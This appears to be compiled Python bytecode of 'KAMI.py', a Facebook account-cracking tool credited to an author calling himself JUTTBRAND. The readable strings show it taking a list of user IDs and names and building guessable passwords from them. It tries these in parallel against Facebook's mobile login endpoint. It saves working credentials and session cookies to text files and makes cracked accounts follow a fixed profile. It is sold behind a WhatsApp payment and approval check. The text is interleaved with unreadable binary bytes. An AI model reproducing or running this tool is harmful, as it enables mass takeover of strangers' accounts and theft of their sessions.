o
    0�b�A  �                   @   s�  d dl Z zd dlZW n ey   ed� e �d� Y nw zd dlZW n ey5   ed� e �d� Y nw zd dlZW n eyN   ed� e �d� Y nw d dlZd dl Z d dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d d	lmZ d d
lmZ e�� ZejZg d�Zzed k s�edkr�e�  ed ZW n ey�   e�  Y nw e�� Z e j!Z"e jZ#e j$Z%ee Z&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.e'e(e)e*e+e,e-e.gZ/e�0e/�Z1i i Z2Z3d\Z4a5Z6g g g Z7Z8Z9g a:g a5g Z;g Z<d a=dZ>dZ?dZ@ddiZAddddddddd d!d"d#d$�ZBd%ZCd&d'� ZDd(ZEd)d*� ZFd+d,� ZGG d-d.� d.�ZHd/d0� ZId1d2� ZJeJ�  e �d3� d4d5� ZKG d6d7� d7�ZLeG�  dS )8�    Nu!   
 [✓] installing requests !...
zpip install requestsu    
 [✓] installing futures !...
zpip install futuresu   
 [✓] installing bs4 !...
zpip install bs4)�ThreadPoolExecutor)�datetime)�BeautifulSoup)�January�February�March�April�May�June�JulyZAgustus�	September�October�November�December�   �   z[1;97mz[1;31mz[1;32mz[0m)r   r   r   zhttps://lookup-id.com/zhttps://m.facebook.comzhttps://www.httpbin.org/ip�
user-agentz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]r   r   r   r   r	   r
   r   ZAugustusr   r   r   r   )�01�02�03Z04Z05Z06Z07Z08Z09Z10Z11Z12Fc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
g{�G�z�?)�sys�stdout�write�flush�time�sleep)�z�e� r   �KAMI.py�jalanE   s
   
�r!   uV     
[0;93m                                          
 |__   __|  | |   (_)
    | | __ _| |__  _ _ __
    | |/ _` | '_ \| | '__|
    | | (_| | | | | | |
    |_|\__,_|_| |_|_|_|[0;95mTOOL BY AWAIS♥️

[0;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[0;93mAUTHOR   : AWAIS TAHIR
 
[0;93mFACEBOOK : TAHIR (JUTTBRAND
 
[0;93mGITHUB   : JUTTBRAND

[0;93mYOUTUBE  : TECHNICAL MASTER

[0;93mSUPPORT  : DARLINGTON(GHOSTSON) X AWAIS(JUTTBRAND)
 
[0;93mTOOLS    :[0;95m FILE CLONING
[0;95m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                              
c                 C   sd   t | �dks	 t |�dkr0tdtttt t��f � tdtttt |��f � td� t�  d S d S )Nr   z8

 [1;92mTOTAL OK : [1;92m %s  [1;92mJUTTBRAND_OK.txtz5 [1;91mTOTAL CP :[1;91m   %s [1;91JUTTBRAND_CP.txtz [1;92mPRESS ENTER TO BACK MENU )�len�print�H�P�str�ok�input�sarfraz)ZOK�cpr   r   r    �hasila   s   
�r+   c                  C   s�   t �d� tt� t�t��� } d}| d }t td� td� td� td�}|dv r2t	� �
t� |dv r;t �d	� |d
v rB	 d S d S )N�clear� �originz [1] START FILE CLONINGz
 [2] EXIT z [?] CHOOSE OPTION : ��1r   ��2r   zpython dm.py)�3r   )�os�systemr#   �logo�requests�get�url_ip�jsonr(   �__xxx__�sarfrazx�id)ZipmZtodzZIPZ_sarfraz___r   r   r    r)   j   s"   

�r)   c                   @   s4   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� ZdS )r;   c                 C   s
   g | _ d S )N)r=   )�selfr   r   r    �__init__�   s   
z__xxx__.__init__c                 C   sx   t �d� tt� td�| _t| j��� �� | _	t �d� tt� td� d}|dv r1| �
�  d S td� | �|� d S )Nr,   zPUT FILE NAME : r-   �y)ZyesZYes�Yr@   z [!] CHOOSE CORRECT ONE)r4   r5   r#   r6   r(   Zcnt�open�read�
splitlinesr=   �__pler__r<   )r>   r=   Z___worldwide___r   r   r    r<   �   s   


z__xxx__.sarfrazxc                 C   s�  t j�dt� dt| j�� dtt�� dtt�� d�	� t j��  �z2|D �]'}|�	� }t
�� }|ddddd	d
ddddddd�}|jd|� d�|d�}t�dt|j���d�t�dt|j���d�|d|dd�}|ddd| ddddd
dddd| d ddd�}	|jd|� d �||	d!d"�}
d#|j�� v r�d$�d%d&� |j�� �� D ��}td't� d(|� d)|� �� d*||f }t�|� td+d,��d-| � | �||�  n�d.|j�� v �rKzBtd/��� }|�d0|� d1|� ���� d2 }|�d3�\}}}t| }td4t ||f � d*||f }t�|� td5d,��d-| � W  n6 t!t"f�y'   d6}d6}d6}Y n   Y td4t ||f � d*||f }t�|� td5d,��d-| �  nq#td7 aW d S    | �#|||� Y d S )7Nz[1;92m[CRACKING] �|z [ok][z] [cp][z] r0   z{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originZcors�emptyZdocumentzhttps://m.facebook.com/zgzip, deflate brzen-GB,en-US;q=0.9,en;q=0.8)�Host�upgrade-insecure-requestsr   �acceptZdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-languagezhttps://zV/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F)�headerszname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"Zlogin_no_pinz8https://developers.facebook.com/tools/debug/accesstoken/)ZlsdZjazoest�uidZflow�pass�nextz	max-age=0z!application/x-www-form-urlencodedz�Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36ZXMLHttpRequest)rH   zcache-controlrI   r.   zcontent-typer   rJ   rK   rL   rM   rN   rO   rP   rQ   rR   z-/login/device-based/validate-password/?shbl=0F)�datarS   Zallow_redirectsZc_user�;c                 S   s   g | ]
\}}|d  | �qS )�=r   )�.0�key�valuer   r   r    �
<listcomp>�   s    z&__xxx__.__metode__.<locals>.<listcomp>�z[JUTTBRAND-OK] z | z%s|%szJUTTBRAND_OK.txt�az%s
Z
checkpointz
.token.txtzhttps://graph.facebook.com/z?fields=birthday&access_token=Zbirthday�/z%s[JUTTBRAND-CP] %s | %s zJUTTBRAND_CP.txtr-   )$r   r   r   �loopr"   r=   r'   r*   r   �lowerr7   ZSessionr8   �re�searchr&   �text�groupZpost�cookiesZget_dict�join�itemsr#   r$   �appendrB   �followrC   r:   �split�	bulan_ttl�M�KeyError�IOError�
__metode__)r>   �userZ__chi__ZcebokZpw�session�header�rZdasZheader1Zpo�cokiZwrtZtokenzZcp_ttl�month�day�yearr   r   r    rq   �   s�   4

��	
�


z__xxx__.__metode__c                 C   sN   t |jdd|id�jd�}|jddd��d�}|jd	t|� d|id�j d S )
Nz:https://mbasic.facebook.com/profile.php?id=100007607054845Zcookie)rg   zhtml.parserr_   ZIkuti)�stringZhrefzhttps://mbasic.facebook.com)r   r8   re   �findr&   )r>   rs   rv   ru   r8   r   r   r    rk   �   s    z__xxx__.followc                 C   s,  t d� t d� td�}|dkrt d� | ��  d S |dv r�t�d� t t� t d� t d	� t d
t| j� � t d� t d	� tdd��n}| jD ]b}z[|�	d�\}}|�	d�}t|�dkspt|�dkspt|�dkspt|�dkr�||d d |d |d  |d d g}n||d d |d |d  |d d g}dg}|�
| j||d� W qI   Y qIW d   � n1 s�w   Y  ttt� d S |dv �r�t�d� t t� t d� td�}td�}	td�}
td�}t�d� t t� t d � t d	� t d!t| j� � t d"� t d	� tdd��q}| jD ]e}z]|�	d�\}}|�	d�}t|�dk�s:t|�dk�s:t|�dk�s:t|�dk�rO||d d |d |d  |d d g}n||d d |d |d  |d d g}|�
| j||d� W �q   Y �qW d   � n	1 �s�w   Y  ttt� d S t d#� | ��  d S )$Nz[1] CRACK WITH AUTO PASS z[2] CRACK WITH NAME DIGIT PASSz
[?] CHOOSE : r-   z
SELECT CORRECT ONEr/   r,   z,[1;91mUSE FLIGHT (airplane) MODE ON[1;96mz2--------------------------------------------------z[1;36mTOTAL IDS : %s z[1;36mCRACKING STARTED.....�   )Zmax_workersrF   � �   �   �   �   r   Z123r   Z12345Z786110zmbasic.facebook.comr1   z&[1;32mENTER LAST NAME DIGITs[1;32m
z  Name + 1 : z  Name + 2 : z  Name + 3 : z  Name + 4 : z4[1;31mUSE FLIGHT (airplane) MODE BEFORE USE[1;32mz[1;32mTOTAL IDS : %s z[1;32mCRACKING STARTED.....z
 Select Valid One)r#   r(   rE   r4   r5   r6   r"   r=   �
sarfrazssbrl   Zsubmitrq   r+   r'   r*   )r>   ZchiZssbworldZzsbrT   �name�xzZpwxZp1Zp2Zp3Zp4r   r   r    rE   �   sx   


0*(��




8*(��z__xxx__.__pler__N)�__name__�
__module__�__qualname__r?   r<   rq   rk   rE   r   r   r   r    r;   �   s    Vr;   c            
   	   C   sx  t �d� tt� ddlm}  td� zd}t�|�}t|d��	� }W n t
tfy1   t�  Y nw zd}t�|�}t�|�j}W n tjjyS   td� t�  Y nw ||v rbt�d	� t�  d S t �d� tt� td
� t t td| d � t td� t td� td� t t td� t t td�}td� td�}td� td� d| d | }	t �d|	 � d S )Nr,   r   )�quotez	Checking For Subscription...
�-   x��OI,I����z%�E���i�9�����E��%�����< }ru   s>   x��())(���/J,�K�,�(M*-N-J��+I�+�K���710���/�uw�/��M���O &!&z[0;37mNo Internet Connectionr   z%[1;97mYour Token Is Not Subscribed
z[1;97m Your Token : r   zTool Price free
�jazzcash Account Number 007
�Account Name NO NAME
z(Payment Successfully Msg Or Token Send
�%Paste Here Payment Successfully Msg:�Paste Here your Token:z%Your Request Submitted Please wait  �jHello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20�%20Token%20:%20�#am start https://wa.me/+92007?text=)r4   r5   r#   r6   Zurllib.parser�   �zlib�
decompressrB   rC   ro   rp   �bnsregr7   r8   re   �
exceptions�ConnectionError�exit�fuckrj   r)   r(   )
r�   �f�bd�toZbtZbwru   �sb�ss�tksr   r   r    �bnsbuy1  sZ   


�

�


r�   c                  C   s�   t t�� �t t�� � } d�| �}td� td| � td� z1t�d�j}||v r<td� t t�� �}t	�
d� W d S td� t�d	� t	�
d� t��  W d S    t��  td
krftt� t�  Y d S Y d S )NrF   u�   [1;92m╭────────────────────────────────────────────╮u.   [1;97m [[1;91m•[1;97m][1;93m  YOUR ID : u�   [1;92m╰────────────────────────────────────────────╯z=https://github.com/JUTTBRAND/Juttbrand/blob/main/Approval.txtuB   [1;97m [[1;92m•[1;97m][1;97m  YOUR ID IS ACTIVE........[97mr   ur   [1;97m [[1;91m•[1;97m][1;93m YOUR ID IS NOT ACTIVE SEND MESSAGE ON WHATSAPP FREE USER PLEASE DONT INBOX[97mz#xdg-open https://wa.me/+97696784016�__main__)r&   r4   �geteuid�getloginrh   r#   r7   r8   re   r   r   r5   r   r�   r�   r6   �chk)�uuidr=   ZhttpCaht�msgr   r   r    r�   `  s,   



�r�   r,   c                  C   s  t �d� tt� td� t tt�t�� d��dd � �� d } t td|  d � t td� t td	� td
� t td� t t	d�}td� t	d�}td� td� d| d | }t �d| � d}t
�|�}t|d�}|�| � |��  t �d� t�d� t�  d S )Nr,   z%[1;97m	Your Token Is Not Subscribed
r   �   z~SSB==z
[1;97m Your Token: [97mr   zTool Price FREE
r�   r�   zPayment Successfully Send
r�   r�   z$Your Request Submitted Please wait  r�   r�   r�   r�   �wr~   )r4   r5   r#   r6   r&   r�   Zuuid1Zgetnode�upperr(   r�   r�   rB   r   �closer   r   r�   )r=   r�   r�   r�   r�   r�   Zsavr   r   r    r�   {  s<   
$





r�   c                   @   s   e Zd Zdd� ZdS )�loadc                 C   s^   d}t d�}t d�}|d8 }|d7 }tt d��D ]}td� tj��  t�d� qtd� d S )	Nr-   Z30�0r   r0   z Please Wait ....g�������?r   )�int�ranger#   r   r   r   r   r   )r>   �_�__Z___�tr   r   r    r?   �  s   
zload.__init__N)r�   r�   r�   r?   r   r   r   r    r�   �  s    r�   )Mr4   r7   �ImportErrorr#   r5   Zconcurrent.futuresZ
concurrentZbs4rc   �platformr   r:   r   Zrandomr   �
subprocessZ	threading�	itertools�base64r�   r�   r   r�   r   ZnowZctrw   �nZbulanr�   ZnTemp�
ValueErrorZcurrentry   �taZburx   Zha�opr%   rn   r$   �K�B�U�O�NZmy_color�choiceZwarnarW   Zdata2Zamanr*   ZsalahZubahPr�   ZpwBarur'   r=   rr   ra   Z
url_lookupZurl_mbr9   Zheader_gruprm   Zdoner!   r6   r+   r)   r;   r�   r�   r�   r�   r   r   r   r    �<module>   s�   ����
��


	 //

